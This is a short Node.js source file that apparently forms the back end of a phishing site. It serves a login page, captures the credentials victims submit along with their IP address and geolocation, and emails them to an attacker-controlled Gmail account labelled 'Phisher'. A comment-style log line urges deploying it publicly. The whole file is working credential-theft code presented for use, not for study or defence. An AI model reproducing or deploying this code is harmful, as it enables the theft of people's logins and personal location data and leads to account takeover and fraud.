require("dotenv").config()

const requestip = require("request-ip")
const geoip = require('geoip-lite');
const nodemailer = require('nodemailer');

const sendToGmail = (data) =>{
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {user: process.env.GMAIL,pass: process.env.PASS}
 });

  let mailOptions = {
    from: process.env.GMAIL, 
    to: process.env.RECGMAIL, 
    subject: `Phisher(IP: ${data.ip})`,
    html: JSON.stringify(data)
  };



  transporter.sendMail(mailOptions, function (err, info) {
    if(err)
      console.log(err)
    else{
      console.log("Email sent.");
    }
  })

}

const phisherGET = (req,res) =>{
  return res.render("index.html",{})
}

const phisherPOST = (req,res) =>{
  const clientIp = requestip.getClientIp(req);
  const geo = geoip.lookup(clientIp);
  if(geo === null){
    console.log("You run this program in your local machine. try to deploy this app.");
  }else{
   sendToGmail({ip: clientIp,geolocation: geo,loginInfo: req.body.info});
 }
}

module.exports = {
  phisherGET : phisherGET,
  phisherPOST : phisherPOST
};